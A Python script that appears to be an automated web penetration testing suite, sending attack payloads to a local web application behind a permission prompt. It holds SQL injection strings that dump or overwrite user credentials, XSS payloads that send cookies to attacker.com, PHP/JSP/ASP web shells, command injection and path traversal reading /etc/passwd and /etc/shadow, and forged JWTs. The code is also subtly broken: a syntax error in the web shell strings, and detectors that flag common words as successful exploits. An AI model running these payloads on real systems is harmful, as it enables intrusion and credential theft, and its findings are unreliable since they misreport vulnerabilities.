#!/usr/bin/env python3
"""
Alex AI Penetration Testing Suite
Real-world security testing against actual vulnerabilities
"""

import os
import sys
import json
import time
import requests
import subprocess
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

class PenetrationTestingSuite:
    def __init__(self):
        self.test_results = []
        self.start_time = time.time()
        self.base_url = "http://localhost:3000"  # Adjust as needed
        self.vulnerabilities_found = []
        self.exploits_successful = []
        
    def run_penetration_tests(self) -> Dict[str, Any]:
        """Run comprehensive penetration testing suite"""
        print("🔴 ALEX AI PENETRATION TESTING SUITE")
        print("=" * 50)
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("⚠️  WARNING: This is a penetration test - use only on authorized systems")
        print()
        
        # Test 1: SQL Injection Attacks
        self.test_sql_injection_attacks()
        
        # Test 2: XSS Attacks
        self.test_xss_attacks()
        
        # Test 3: Authentication Bypass
        self.test_authentication_bypass()
        
        # Test 4: Authorization Bypass
        self.test_authorization_bypass()
        
        # Test 5: Session Hijacking
        self.test_session_hijacking()
        
        # Test 6: CSRF Attacks
        self.test_csrf_attacks()
        
        # Test 7: File Upload Vulnerabilities
        self.test_file_upload_vulnerabilities()
        
        # Test 8: Directory Traversal
        self.test_directory_traversal()
        
        # Test 9: Command Injection
        self.test_command_injection()
        
        # Test 10: Information Disclosure
        self.test_information_disclosure()
        
        # Generate penetration test report
        return self.generate_penetration_report()
    
    def test_sql_injection_attacks(self):
        """Test SQL injection attacks"""
        print("🔍 Testing SQL Injection Attacks...")
        
        test_results = {
            "test_name": "SQL Injection Attacks",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "HIGH"
        }
        
        # Advanced SQL injection payloads
        sql_payloads = [
            # Union-based injection
            "1' UNION SELECT username, password FROM users--",
            "1' UNION SELECT table_name, column_name FROM information_schema.tables--",
            "1' UNION SELECT 1, version()--",
            
            # Boolean-based blind injection
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND (SELECT LENGTH(password) FROM users WHERE id=1) > 5--",
            "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a'--",
            
            # Time-based blind injection
            "1'; WAITFOR DELAY '00:00:05'--",
            "1'; SELECT SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            
            # Error-based injection
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Second-order injection
            "1'; INSERT INTO logs VALUES ('admin', '1'' OR 1=1--');--",
            "1'; UPDATE users SET password='1'' OR 1=1--' WHERE id=1;--"
        ]
        
        for payload in sql_payloads:
            try:
                # Test different endpoints
                endpoints = ["/api/users", "/api/search", "/api/data", "/api/reports"]
                
                for endpoint in endpoints:
                    response = self.make_request("POST", endpoint, {
                        "id": payload,
                        "query": payload,
                        "search": payload,
                        "filter": payload
                    })
                    
                    # Check for successful injection
                    if self.detect_sql_injection_success(response, payload):
                        vulnerability = {
                            "payload": payload,
                            "endpoint": endpoint,
                            "response": response.get("body", "")[:200],
                            "severity": "HIGH"
                        }
                        test_results["vulnerabilities"].append(vulnerability)
                        test_results["exploits"].append(f"SQL injection successful on {endpoint}")
                        
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "payload": payload,
                    "error": str(e),
                    "severity": "MEDIUM"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_xss_attacks(self):
        """Test XSS attacks"""
        print("🔍 Testing XSS Attacks...")
        
        test_results = {
            "test_name": "XSS Attacks",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "MEDIUM"
        }
        
        # Advanced XSS payloads
        xss_payloads = [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Event handler injection
            "<div onmouseover=alert('XSS')>hover me</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "JAVASCRIPT:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            
            # Data URI
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            
            # Filter bypass techniques
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            
            # DOM-based XSS
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>",
            
            # Stored XSS
            "<script>setTimeout(function(){alert('Stored XSS')},1000)</script>",
            "<script>setInterval(function(){alert('Persistent XSS')},5000)</script>"
        ]
        
        for payload in xss_payloads:
            try:
                # Test different endpoints
                endpoints = ["/api/comments", "/api/profile", "/api/content", "/api/messages"]
                
                for endpoint in endpoints:
                    response = self.make_request("POST", endpoint, {
                        "content": payload,
                        "comment": payload,
                        "description": payload,
                        "message": payload
                    })
                    
                    # Check for successful XSS
                    if self.detect_xss_success(response, payload):
                        vulnerability = {
                            "payload": payload,
                            "endpoint": endpoint,
                            "response": response.get("body", "")[:200],
                            "severity": "MEDIUM"
                        }
                        test_results["vulnerabilities"].append(vulnerability)
                        test_results["exploits"].append(f"XSS successful on {endpoint}")
                        
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "payload": payload,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_authentication_bypass(self):
        """Test authentication bypass techniques"""
        print("🔍 Testing Authentication Bypass...")
        
        test_results = {
            "test_name": "Authentication Bypass",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "CRITICAL"
        }
        
        # Authentication bypass techniques
        bypass_techniques = [
            # SQL injection in login
            {"username": "admin'--", "password": "anything"},
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin' OR 1=1--", "password": "anything"},
            
            # JWT manipulation
            {"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbiJ9."},
            {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiJ9.invalid"},
            
            # Parameter pollution
            {"username": "admin", "password": "password", "username": "hacker"},
            {"user": "admin", "pass": "password"},
            
            # HTTP method manipulation
            {"method": "GET", "username": "admin", "password": "password"},
            {"method": "PUT", "username": "admin", "password": "password"},
            
            # Header manipulation
            {"username": "admin", "password": "password", "X-Forwarded-For": "127.0.0.1"},
            {"username": "admin", "password": "password", "X-Real-IP": "127.0.0.1"}
        ]
        
        for technique in bypass_techniques:
            try:
                response = self.make_request("POST", "/api/auth/login", technique)
                
                # Check for successful bypass
                if self.detect_auth_bypass_success(response):
                    vulnerability = {
                        "technique": technique,
                        "response": response.get("body", "")[:200],
                        "severity": "CRITICAL"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append("Authentication bypass successful")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "technique": technique,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_authorization_bypass(self):
        """Test authorization bypass techniques"""
        print("🔍 Testing Authorization Bypass...")
        
        test_results = {
            "test_name": "Authorization Bypass",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "HIGH"
        }
        
        # Authorization bypass techniques
        bypass_techniques = [
            # IDOR (Insecure Direct Object Reference)
            {"user_id": "1", "action": "view"},
            {"user_id": "2", "action": "edit"},
            {"user_id": "999", "action": "delete"},
            
            # Privilege escalation
            {"role": "admin", "action": "create_user"},
            {"role": "superuser", "action": "delete_all"},
            {"permission": "admin", "action": "system_config"},
            
            # Path traversal
            {"file": "../../../etc/passwd"},
            {"file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"},
            {"path": "/etc/shadow"},
            
            # Parameter manipulation
            {"id": "1", "admin": "true"},
            {"user": "admin", "level": "999"},
            {"access": "full", "bypass": "true"}
        ]
        
        for technique in bypass_techniques:
            try:
                response = self.make_request("GET", "/api/admin", technique)
                
                # Check for successful bypass
                if self.detect_authz_bypass_success(response):
                    vulnerability = {
                        "technique": technique,
                        "response": response.get("body", "")[:200],
                        "severity": "HIGH"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append("Authorization bypass successful")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "technique": technique,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_session_hijacking(self):
        """Test session hijacking techniques"""
        print("🔍 Testing Session Hijacking...")
        
        test_results = {
            "test_name": "Session Hijacking",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "HIGH"
        }
        
        # Session hijacking techniques
        hijacking_techniques = [
            # Session fixation
            {"session_id": "fixed_session_123"},
            {"jsessionid": "fixed_jsession_123"},
            {"phpsessid": "fixed_php_123"},
            
            # Session prediction
            {"session_id": "123456789"},
            {"session_id": "000000000"},
            {"session_id": "111111111"},
            
            # Session brute force
            {"session_id": "admin"},
            {"session_id": "test"},
            {"session_id": "user"},
            
            # Cookie manipulation
            {"cookie": "session=admin; path=/"},
            {"cookie": "auth=admin; domain=.example.com"},
            {"cookie": "token=admin; secure=false"}
        ]
        
        for technique in hijacking_techniques:
            try:
                response = self.make_request("GET", "/api/session", {}, headers=technique)
                
                # Check for successful hijacking
                if self.detect_session_hijacking_success(response):
                    vulnerability = {
                        "technique": technique,
                        "response": response.get("body", "")[:200],
                        "severity": "HIGH"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append("Session hijacking successful")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "technique": technique,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_csrf_attacks(self):
        """Test CSRF attacks"""
        print("🔍 Testing CSRF Attacks...")
        
        test_results = {
            "test_name": "CSRF Attacks",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "MEDIUM"
        }
        
        # CSRF attack techniques
        csrf_techniques = [
            # Form-based CSRF
            {"action": "delete_user", "user_id": "1"},
            {"action": "change_password", "new_password": "hacked"},
            {"action": "grant_admin", "user_id": "2"},
            
            # JSON CSRF
            {"Content-Type": "application/json", "action": "delete_all"},
            {"Content-Type": "text/plain", "action": "system_reset"},
            
            # Header manipulation
            {"X-Requested-With": "XMLHttpRequest", "action": "admin_action"},
            {"Origin": "https://trusted-site.com", "action": "sensitive_action"}
        ]
        
        for technique in csrf_techniques:
            try:
                response = self.make_request("POST", "/api/admin", technique)
                
                # Check for successful CSRF
                if self.detect_csrf_success(response):
                    vulnerability = {
                        "technique": technique,
                        "response": response.get("body", "")[:200],
                        "severity": "MEDIUM"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append("CSRF attack successful")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "technique": technique,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_file_upload_vulnerabilities(self):
        """Test file upload vulnerabilities"""
        print("🔍 Testing File Upload Vulnerabilities...")
        
        test_results = {
            "test_name": "File Upload Vulnerabilities",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "HIGH"
        }
        
        # Malicious file uploads
        malicious_files = [
            {"filename": "shell.php", "content": "<?php system($_GET['cmd']); ?>"},
            {"filename": "shell.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>"},
            {"filename": "shell.asp", "content": "<% eval request("cmd") %>"},
            {"filename": "test.php.jpg", "content": "<?php system($_GET['cmd']); ?>"},
            {"filename": "shell.phtml", "content": "<?php system($_GET['cmd']); ?>"},
            {"filename": "shell.php5", "content": "<?php system($_GET['cmd']); ?>"}
        ]
        
        for file_data in malicious_files:
            try:
                response = self.make_request("POST", "/api/upload", file_data)
                
                # Check for successful upload
                if self.detect_file_upload_success(response):
                    vulnerability = {
                        "file": file_data["filename"],
                        "response": response.get("body", "")[:200],
                        "severity": "HIGH"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append(f"Malicious file upload successful: {file_data['filename']}")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "file": file_data["filename"],
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_directory_traversal(self):
        """Test directory traversal vulnerabilities"""
        print("🔍 Testing Directory Traversal...")
        
        test_results = {
            "test_name": "Directory Traversal",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "HIGH"
        }
        
        # Directory traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for payload in traversal_payloads:
            try:
                response = self.make_request("GET", f"/api/files?path={payload}", {})
                
                # Check for successful traversal
                if self.detect_directory_traversal_success(response):
                    vulnerability = {
                        "payload": payload,
                        "response": response.get("body", "")[:200],
                        "severity": "HIGH"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append(f"Directory traversal successful: {payload}")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "payload": payload,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        print("🔍 Testing Command Injection...")
        
        test_results = {
            "test_name": "Command Injection",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "CRITICAL"
        }
        
        # Command injection payloads
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& id",
            "` whoami `",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)"
        ]
        
        for payload in command_payloads:
            try:
                response = self.make_request("POST", "/api/execute", {
                    "command": payload,
                    "input": payload,
                    "query": payload
                })
                
                # Check for successful injection
                if self.detect_command_injection_success(response):
                    vulnerability = {
                        "payload": payload,
                        "response": response.get("body", "")[:200],
                        "severity": "CRITICAL"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append(f"Command injection successful: {payload}")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "payload": payload,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def test_information_disclosure(self):
        """Test information disclosure vulnerabilities"""
        print("🔍 Testing Information Disclosure...")
        
        test_results = {
            "test_name": "Information Disclosure",
            "vulnerabilities": [],
            "exploits": [],
            "severity": "MEDIUM"
        }
        
        # Information disclosure endpoints
        disclosure_endpoints = [
            "/api/debug",
            "/api/status",
            "/api/health",
            "/api/version",
            "/api/config",
            "/api/logs",
            "/api/errors",
            "/.env",
            "/config.json",
            "/package.json"
        ]
        
        for endpoint in disclosure_endpoints:
            try:
                response = self.make_request("GET", endpoint, {})
                
                # Check for information disclosure
                if self.detect_information_disclosure(response):
                    vulnerability = {
                        "endpoint": endpoint,
                        "response": response.get("body", "")[:200],
                        "severity": "MEDIUM"
                    }
                    test_results["vulnerabilities"].append(vulnerability)
                    test_results["exploits"].append(f"Information disclosed on {endpoint}")
                    
            except Exception as e:
                test_results["vulnerabilities"].append({
                    "endpoint": endpoint,
                    "error": str(e),
                    "severity": "LOW"
                })
        
        self.test_results.append(test_results)
        print(f"   Vulnerabilities found: {len(test_results['vulnerabilities'])}")
        print(f"   Successful exploits: {len(test_results['exploits'])}")
        print()
    
    def detect_sql_injection_success(self, response: Dict, payload: str) -> bool:
        """Detect successful SQL injection"""
        body = response.get("body", "").lower()
        status_code = response.get("status_code", 0)
        
        # Check for SQL error messages
        sql_errors = [
            "mysql", "postgresql", "sqlite", "oracle", "mssql",
            "syntax error", "sql error", "database error",
            "table", "column", "select", "insert", "update", "delete"
        ]
        
        for error in sql_errors:
            if error in body:
                return True
        
        # Check for successful data extraction
        if "password" in body or "username" in body or "admin" in body:
            return True
        
        return False
    
    def detect_xss_success(self, response: Dict, payload: str) -> bool:
        """Detect successful XSS"""
        body = response.get("body", "")
        
        # Check if payload is reflected without sanitization
        if payload in body:
            return True
        
        # Check for script execution indicators
        if "<script>" in body or "javascript:" in body:
            return True
        
        return False
    
    def detect_auth_bypass_success(self, response: Dict) -> bool:
        """Detect successful authentication bypass"""
        status_code = response.get("status_code", 0)
        body = response.get("body", "").lower()
        
        # Check for successful authentication
        if status_code == 200 and ("token" in body or "success" in body or "authenticated" in body):
            return True
        
        return False
    
    def detect_authz_bypass_success(self, response: Dict) -> bool:
        """Detect successful authorization bypass"""
        status_code = response.get("status_code", 0)
        body = response.get("body", "").lower()
        
        # Check for successful authorization
        if status_code == 200 and ("admin" in body or "privileged" in body or "authorized" in body):
            return True
        
        return False
    
    def detect_session_hijacking_success(self, response: Dict) -> bool:
        """Detect successful session hijacking"""
        status_code = response.get("status_code", 0)
        body = response.get("body", "").lower()
        
        # Check for successful session access
        if status_code == 200 and ("session" in body or "authenticated" in body):
            return True
        
        return False
    
    def detect_csrf_success(self, response: Dict) -> bool:
        """Detect successful CSRF attack"""
        status_code = response.get("status_code", 0)
        body = response.get("body", "").lower()
        
        # Check for successful CSRF
        if status_code == 200 and ("success" in body or "updated" in body or "deleted" in body):
            return True
        
        return False
    
    def detect_file_upload_success(self, response: Dict) -> bool:
        """Detect successful malicious file upload"""
        status_code = response.get("status_code", 0)
        body = response.get("body", "").lower()
        
        # Check for successful upload
        if status_code == 200 and ("uploaded" in body or "success" in body):
            return True
        
        return False
    
    def detect_directory_traversal_success(self, response: Dict) -> bool:
        """Detect successful directory traversal"""
        body = response.get("body", "")
        
        # Check for system file content
        system_files = ["root:", "bin:", "daemon:", "adm:", "lp:", "sync:", "shutdown:"]
        
        for file_content in system_files:
            if file_content in body:
                return True
        
        return False
    
    def detect_command_injection_success(self, response: Dict) -> bool:
        """Detect successful command injection"""
        body = response.get("body", "").lower()
        
        # Check for command execution results
        command_indicators = ["uid=", "gid=", "groups=", "root", "bin", "daemon"]
        
        for indicator in command_indicators:
            if indicator in body:
                return True
        
        return False
    
    def detect_information_disclosure(self, response: Dict) -> bool:
        """Detect information disclosure"""
        body = response.get("body", "").lower()
        
        # Check for sensitive information
        sensitive_info = [
            "password", "secret", "key", "token", "api_key",
            "database", "connection", "config", "environment"
        ]
        
        for info in sensitive_info:
            if info in body:
                return True
        
        return False
    
    def make_request(self, method: str, endpoint: str, data: Dict = None, headers: Dict = None) -> Dict[str, Any]:
        """Make HTTP request"""
        try:
            url = f"{self.base_url}{endpoint}"
            request_headers = {"Content-Type": "application/json"}
            if headers:
                request_headers.update(headers)
            
            if method.upper() == "GET":
                response = requests.get(url, headers=request_headers, timeout=10)
            elif method.upper() == "POST":
                response = requests.post(url, json=data, headers=request_headers, timeout=10)
            else:
                response = requests.request(method, url, json=data, headers=request_headers, timeout=10)
            
            return {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text
            }
        except requests.exceptions.RequestException as e:
            return {
                "status_code": 0,
                "headers": {},
                "body": f"Request failed: {str(e)}"
            }
    
    def generate_penetration_report(self) -> Dict[str, Any]:
        """Generate comprehensive penetration test report"""
        total_vulnerabilities = sum(len(result["vulnerabilities"]) for result in self.test_results)
        total_exploits = sum(len(result["exploits"]) for result in self.test_results)
        
        # Categorize vulnerabilities by severity
        critical_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "CRITICAL")
        high_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "HIGH")
        medium_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "MEDIUM")
        low_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "LOW")
        
        end_time = time.time()
        duration = end_time - self.start_time
        
        # Determine overall risk level
        if critical_vulns > 0:
            risk_level = "CRITICAL"
        elif high_vulns > 0:
            risk_level = "HIGH"
        elif medium_vulns > 0:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "duration_seconds": round(duration, 2),
            "risk_level": risk_level,
            "total_vulnerabilities": total_vulnerabilities,
            "total_exploits": total_exploits,
            "vulnerability_breakdown": {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            },
            "test_results": self.test_results,
            "recommendations": self.generate_penetration_recommendations(),
            "summary": f"Penetration Test Results: {risk_level} risk level - {total_vulnerabilities} vulnerabilities found, {total_exploits} successful exploits"
        }
        
        return report
    
    def generate_penetration_recommendations(self) -> List[str]:
        """Generate penetration test recommendations"""
        recommendations = []
        
        # Check for critical vulnerabilities
        critical_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "CRITICAL")
        if critical_vulns > 0:
            recommendations.append(f"CRITICAL: {critical_vulns} critical vulnerabilities found - immediate action required")
        
        # Check for high vulnerabilities
        high_vulns = sum(1 for result in self.test_results for vuln in result["vulnerabilities"] if vuln.get("severity") == "HIGH")
        if high_vulns > 0:
            recommendations.append(f"HIGH: {high_vulns} high-severity vulnerabilities found - address within 24 hours")
        
        # Check for specific vulnerability types
        sql_injection_vulns = sum(1 for result in self.test_results if result["test_name"] == "SQL Injection Attacks" for vuln in result["vulnerabilities"])
        if sql_injection_vulns > 0:
            recommendations.append("Implement parameterized queries and input validation")
        
        xss_vulns = sum(1 for result in self.test_results if result["test_name"] == "XSS Attacks" for vuln in result["vulnerabilities"])
        if xss_vulns > 0:
            recommendations.append("Implement proper output encoding and Content Security Policy")
        
        auth_bypass_vulns = sum(1 for result in self.test_results if result["test_name"] == "Authentication Bypass" for vuln in result["vulnerabilities"])
        if auth_bypass_vulns > 0:
            recommendations.append("Strengthen authentication mechanisms and implement proper session management")
        
        return recommendations

def main():
    """Main function to run penetration testing suite"""
    print("⚠️  WARNING: This is a penetration testing tool.")
    print("   Only use on systems you own or have explicit permission to test.")
    print("   Unauthorized testing is illegal and unethical.")
    print()
    
    confirm = input("Do you have permission to test this system? (yes/no): ")
    if confirm.lower() != "yes":
        print("❌ Penetration testing aborted - no permission granted")
        return 1
    
    tester = PenetrationTestingSuite()
    
    try:
        report = tester.run_penetration_tests()
        
        # Print summary
        print("=" * 50)
        print("🔴 PENETRATION TEST SUMMARY")
        print("=" * 50)
        print(f"Risk Level: {report['risk_level']}")
        print(f"Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"Successful Exploits: {report['total_exploits']}")
        print(f"Duration: {report['duration_seconds']} seconds")
        print()
        
        print("Vulnerability Breakdown:")
        print(f"  Critical: {report['vulnerability_breakdown']['critical']}")
        print(f"  High: {report['vulnerability_breakdown']['high']}")
        print(f"  Medium: {report['vulnerability_breakdown']['medium']}")
        print(f"  Low: {report['vulnerability_breakdown']['low']}")
        print()
        
        if report['recommendations']:
            print("📋 RECOMMENDATIONS:")
            for rec in report['recommendations']:
                print(f"   • {rec}")
            print()
        
        # Save report
        report_file = f"penetration_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"📄 Detailed report saved to: {report_file}")
        
        return 0
        
    except Exception as e:
        print(f"❌ Penetration testing failed with error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
